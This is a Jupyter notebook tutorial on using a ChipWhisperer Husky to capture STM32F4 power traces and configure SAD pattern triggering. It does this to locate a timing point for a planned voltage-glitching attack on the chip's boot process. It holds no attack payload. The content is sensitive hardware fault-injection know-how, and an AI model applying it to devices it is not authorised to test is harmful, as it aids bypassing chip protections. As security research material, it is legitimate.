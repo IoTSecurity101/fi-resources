{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "23fa18b6-1788-4221-9224-68c5a5d79d46",
   "metadata": {},
   "source": [
    "# Husky SAD Capure / Triggering Example\n",
    "\n",
    "# Overview\n",
    "\n",
    "The puspose of this notebook is to provide a simple guide to capturing power traces and setting up SAD triggers with the Chipwhisperer Husky. \n",
    "\n",
    "## SAD: Overview\n",
    "\n",
    "One of the many powerful new features on the ChipWhisperer Husky is the ability to trigger on the detection of a particular waveform pattern. This is done via a \"SAD\" trigger, which stands for Sum of Absolute Differences. \n",
    "\n",
    "In order to do this, we must capture a baseline power trace and identify a pattern that we wish to use as a trigger. With the waveform data specific, the ChipWhisperer will then monitor the analog input signal and look for the same pattern, when that pattern is detected, a trigger event will occur.\n",
    "\n",
    "Of course, no two analog data samples are identical, so we can specify a threshold that we want the trigger module to use. \n",
    "\n",
    "The image below from the NEWAE wiki explains this nicely:\n",
    "\n",
    "![NEWAE Wiki](https://wiki.newae.com/images/c/cf/Sad_diagram.png)\n",
    "\n",
    "# Target Overview and Preparation\n",
    "\n",
    "The target that this work will be focusing on is the STM32F4X, see the corresponding blog post for more details.\n",
    "\n",
    "# Capture Baseline Trace\n",
    "\n",
    "The first thing that we need to do is capture our baseline trace that we want to reference for our trigger. Before we do that, we will import some common libraries and define some helper functions for later. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "6394f927-eeb0-43ba-a3d9-89efffb919ef",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import chipwhisperer as cw\n",
    "import matplotlib.pyplot as plt\n",
    "import time\n",
    "\n",
    "#scope = cw.scope(scope_type=cw.scopes.OpenADC)\n",
    "#scope.default_setup()\n",
    "\n",
    "def reset_and_trigger():\n",
    "    global scope\n",
    "    scope.io.target_pwr = False\n",
    "    time.sleep(1)\n",
    "    scope.arm()\n",
    "    scope.io.target_pwr = True\n",
    "    scope.capture()\n",
    "    return scope.get_last_trace()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "75825967-f9e8-4a08-ba01-63123e2931e7",
   "metadata": {},
   "source": [
    "## Scope Configuration\n",
    "Next we configure the scope and set up the baseline trace. One thing to remember is that since we are planning on using a SAD trigger, we have to ensure that we area always using the same scope settings. For this first capture, we are going to trigger off of the ```RST``` line on the development board which can be seen in the image below:\n",
    "\n",
    "![TODO](../images/rst.jpg)\n",
    "\n",
    "The scope settings below will eventually be changed when we want to set up our SAD triggeting, but before we do that we need to capture the data that we wish to use as a baseline. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72cfe7eb-2271-4f94-827b-10369e7de7c1",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "scope.adc.basic_mode = \"rising_edge\"\n",
    "scope.gain.gain = 0\n",
    "scope.gain.db = 15.0\n",
    "scope.gain.mode = \"low\"\n",
    "scope.adc.samples = 131124\n",
    "scope.clock.clkgen_freq = 30e6\n",
    "scope.adc.offset = 0\n",
    "scope.clock.adc_mul = 1\n",
    "time.sleep(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fab2445e-c17a-4e8d-b714-6e47845da87f",
   "metadata": {},
   "source": [
    "## Baseline Power Capture\n",
    "Now that we have our scope configured, we will capture a power trace of our target signal, in our case this will be the VCAP lines on the STM32F4. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "68e73eaf-d3a4-44a0-8422-664417e3dd45",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "vcap_ref = []\n",
    "vcap_ref.append(reset_and_trigger())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1d9a7dbd-7d57-4a5e-8b67-4717e0d7a194",
   "metadata": {},
   "source": [
    "## Graph the Capture\n",
    "Now that we have captured a power trace in ```vcap_ref```, let's examine the power trace using matplotlib. An example interractive graph can be generated using the cell below. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7799ae1f-5f97-4c69-ae63-3389f377df4a",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "%matplotlib widget\n",
    "import matplotlib.pyplot as plt\n",
    "plt.cla()\n",
    "plt.plot(vcap_ref[-1])\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ce039f41-1662-44b6-8b57-08dfe48b03ef",
   "metadata": {},
   "source": [
    "## Reviewing the Capture\n",
    "\n",
    "Note that in this capture, we have a long period of time where there is almost _no_ activity going on, but right around offset 40000, we see some voltage fluctuations. \n",
    "\n",
    "![STM32F4 Power Trace](..//images/base.png)\n",
    "\n",
    "If we zoom in on the graph we see the following interesting shape:\n",
    "\n",
    "![STM32F4 Boot Rom Execution Trace](..//images/full_trace.png)\n",
    "\n",
    "This is likely the beginning of the bootrom execution, it even has a similar shape to the waveform that we captured in the [last post](https://voidstarsec.com/blog/replicant-part-1) on the Trezor One:\n",
    "\n",
    "![STM32F4 Boot Rom Execution Trace](..//images/bootrom.png)\n",
    "\n",
    "\n",
    "![Trezor Capture](..//images/trezor_trace.png)\n",
    "\n",
    "After this sequence, we have one more block of activity before the power trace normalizes and if we zoom in on this even _further_ we can see that there is a slight difference in activity toward the end:\n",
    "\n",
    "![Trezor Capture](..//images/flash_check.png)\n",
    "\n",
    "At this point, we have identified a possible location to initially target with our voltage glitching attack. However, we need to idenfity a consistent, reliable trigger. While the reset line will work, it would be great if we could trigger off of the actual power trace data, luckily the ChipWhisperer Husky offers us another option called Sum of Absolute Difference triggering. \n",
    "\n",
    "We will use this waveform as our reference for the SAD triggering, based on the graph execution appears to begin at offset 39850. We can use this downward spike as a reference for our SAD trigger, see the screenshow below for a zoomed in screenshot of the trace. \n",
    "\n",
    "![Trezor Capture](../images/SAD-trigger.png)\n",
    "\n",
    "In the following cell we will set up the reference waveform and configure the Scope to take a test power capture using the SAD trigger. If we set up the various paramters properly, then we should expect to see the same waveform in our capture.\n",
    "\n",
    "## Scope Configuration\n",
    "- ```scope.SAD.reference```: This is the reference waveform that we want the scope to trigger on, this is where we specify the pattern that we want the scope to look for \n",
    "    - [Link to reference in source](https://chipwhisperer.readthedocs.io/en/latest/scope-api.html#chipwhisperer.capture.scopes.cwhardware.ChipWhispererSAD.HuskySAD.reference)\n",
    "- ```scope.SAD.threshold```: This is the threshold that will be used for the SAD trigger, this is what will be compared against the _difference_ between our captured reace and our reference trace.\n",
    "    - [Link to reference in source](https://chipwhisperer.readthedocs.io/en/latest/scope-api.html#chipwhisperer.capture.scopes.cwhardware.ChipWhispererSAD.ChipWhispererSAD.threshold)\n",
    "- ```scope.adc.presamples```: This is how many samples are captured **before** the trigger event\n",
    "    - [Link to refernece in source](https://chipwhisperer.readthedocs.io/en/latest/scope-api.html#chipwhisperer.capture.scopes._OpenADCInterface.TriggerSettings.presamples)\n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e152842-7664-49e0-a6ae-3d074f75fcb7",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "triggered_captures = []\n",
    "scope.reset_fpga()\n",
    "scope.trigger.module = 'SAD'\n",
    "# NOTE - Change this trace offset to match what you want to trigger on for your SAD trigger\n",
    "trace_offset = 39900\n",
    "scope.SAD.reference = test.waves[0][trace_offset:trace_offset+32]\n",
    "scope.SAD.threshold =60\n",
    "scope.adc.presamples = 1000\n",
    "triggered_captures.append(reset_and_trigger())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "13ad097e-dbe1-47a7-a678-5fcbc3e7faa1",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "%matplotlib widget\n",
    "plt.cla()\n",
    "plt.clf()\n",
    "plt.plot(triggered_captures[-1])\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4d55aaa3-8412-4b9a-a7dd-4794c9177ce2",
   "metadata": {},
   "source": [
    "## Side Note: Saving Power Traces and Captures\n",
    "\n",
    "One of the biggest problems with reproducing fault injection work is that results can be difficult to replicate across different hardware configurations. Things such as wire length, shielding can affect the way captures are collected and the resulting shapes of the waveforms. Lucklily for us, the ChipWhisperer has methods to export captured traces and import them. If you want to save your captures to a ChipWhisperer project, here is some example code to do so:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "69809bdb-67ae-480d-9ed4-e1d758a65499",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Create and export example project\n",
    "proj = cw.create_project(\"traces/stm32f4-trace-example-vcap\")\n",
    "trace = cw.Trace(vcap_ref[0], None, None, None)\n",
    "proj.traces.append(trace)\n",
    "proj.save()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fe1b60dc-5c06-4465-bdbb-a90cbd361c7f",
   "metadata": {},
   "source": [
    "## Side Note: Importing a Capture\n",
    "\n",
    "Or, if you want to import our captures for your own usage and analysis, you can load them using the example code below:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "264b9a0a-7b1b-492f-b6b3-9f15fd84d47b",
   "metadata": {},
   "outputs": [],
   "source": [
    "test = cw.open_project(\"traces/stm32f4-traces-vcap\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c910b72f-5d01-4cb4-a87c-3a45455f938f",
   "metadata": {},
   "source": [
    "This data can be loaded and reviewed as shown below:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "2291150c-49fa-4c06-b7ef-10e43968b98e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "10e2aeda40704da3aac84be16aee033c",
       "version_major": 2,
       "version_minor": 0
      },
      "image/png": "[encoded data removed]",
      "text/html": [
       "\n",
       "            <div style=\"display: inline-block;\">\n",
       "                <div class=\"jupyter-widgets widget-label\" style=\"text-align: center;\">\n",
       "                    Figure\n",
       "                </div>\n",
       "                <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAoAAAAHgCAYAAAA10dzkAAAAOXRFWHRTb2Z0d2FyZQBNYXRwbG90bGliIHZlcnNpb24zLjUuMSwgaHR0cHM6Ly9tYXRwbG90bGliLm9yZy/YYfK9AAAACXBIWXMAAA9hAAAPYQGoP6dpAABBkklEQVR4nO3deXxU1f3/8Xf2BEjCEsgCAQJWQAOKiWJYRFzCJoilFVBxp0ZBtloBkYpUFpda6k+WL4i2VhTagpZqigQURAlQIEFAEJSwGBJCgGTClvX+/qAZM0wC2ecO9/V8PObxcO6ce+dzj8PMO+fee66HYRiGAAAAYBmeri4AAAAA9YsACAAAYDEEQAAAAIshAAIAAFgMARAAAMBiCIAAAAAWQwAEAACwGAIgAACAxRAAAQAALIYACAAAYDEEQAAAAIshAAIAAFgMARAAAMBiCIAAAAAWQwAEAACwGAIgAACAxRAAAQAALIYACAAAYDEEQAAAAIshAAIAAFgMARAAAMBiCIAAAAAWQwAEAACwGAIgAACAxRAAAQAALIYACAAAYDEEQAAAAIshAAIAAFgMARAAAMBiCIAAAAAWQwAEAACwGAIgAACAxRAAAQAALIYACAAAYDEEQAAAAIshAAIAAFgMARAAAMBiCIAAAAAWQwAEAACwGAIgAACAxRAAAQAALIYACAAAYDEEQAAAAIshAAIAAFgMARAAAMBiCIAAAAAWQwAEAACwGAIgAACAxRAAAQAALIYACAAAYDEEQAAAAIshAAIAAFgMARAAAMBiCIAAAAAWQwAEAACwGAIgAACAxXi7ugB3VlJSomPHjikwMFAeHh6uLgcAAFSCYRjKy8tTRESEPD2tORZGAKyBY8eOKTIy0tVlAACAajh69KhatWrl6jJcggBYA4GBgZIufoCCgoJcXA0AAKgMm82myMhI+++4FREAa6D0sG9QUBABEAAAN2Pl07eseeAbAADAwgiAAAAAFkMABAAAsBgCIAAAgMUQAAEAACyGAAgAAGAxBEAAAACLIQACAABYDAEQAADAYgiAAAAAFkMABAAAsBgCIAAAgMUQAAE3dCIvX7MT9yot+6yrSwEAuCECIOCGxi9P0f99dVCD3/7a1aUAANwQARBwQzsO50iS8i4UubYQAIBbIgACAABYDAEQAADAYgiAgBvy8HB1BQAAd0YABAAAsBgCIAAAgMUQAAEAACyGAAi4IU4BBADUBAEQAADAYgiAAAAAFkMABAAAsBgCIAAAgMUQAAEAACyGAAgAAGAxBEDADXlwLzgAQA0QAAEAACyGAAgAAGAxBEAAAACLIQACbogzAAEANUEABAAAsBgCIAAAgMUQAAF3xDFgAEANEAABd2S4ugAAgDsjAAIAAFgMARAAAMBi3CYAzp8/X1FRUfL391dMTIw2btx42fYbNmxQTEyM/P391a5dOy1cuNCpzdy5c9WhQwcFBAQoMjJSEyZM0IULF+pqF4DawzmAAIAacIsAuHz5co0fP15Tp05VSkqKevXqpf79++vIkSPltk9LS9OAAQPUq1cvpaSk6IUXXtDYsWO1YsUKe5ulS5dq8uTJeumll7R3714tWbJEy5cv15QpU+prtwAAAFzCwzAM059O3q1bN910001asGCBfVmnTp00ZMgQzZ4926n9pEmTtGrVKu3du9e+LCEhQTt37lRycrIkacyYMdq7d6/WrVtnb/Pb3/5WW7duveLoYimbzabg4GDl5uYqKCioursHVFnn6Z8r70KRJOnQnIEurgYA3Au/324wAlhQUKDt27crPj7eYXl8fLw2bdpU7jrJyclO7fv27att27apsLBQktSzZ09t375dW7dulSQdPHhQiYmJGjiw4h/T/Px82Ww2hwfgChwBBgDUhLerC7iS7OxsFRcXKzQ01GF5aGioMjMzy10nMzOz3PZFRUXKzs5WeHi4hg8frhMnTqhnz54yDENFRUV6+umnNXny5AprmT17tl5++eWa7xQAAIALmX4EsJSHh+OYh2EYTsuu1L7s8vXr12vmzJmaP3++duzYoZUrV+rTTz/VH/7whwq3OWXKFOXm5tofR48ere7uAAAAuIzpRwBDQkLk5eXlNNqXlZXlNMpXKiwsrNz23t7eatasmSRp2rRpGjlypJ588klJUufOnXX27Fn95je/0dSpU+Xp6ZyN/fz85OfnVxu7BQAA4DKmHwH09fVVTEyMkpKSHJYnJSWpe/fu5a4TFxfn1H7NmjWKjY2Vj4+PJOncuXNOIc/Ly0uGYcgNrouBxV1u9BsAgCsxfQCUpIkTJ+qdd97Ru+++q71792rChAk6cuSIEhISJF08NPvwww/b2yckJOjw4cOaOHGi9u7dq3fffVdLlizRc889Z28zaNAgLViwQMuWLVNa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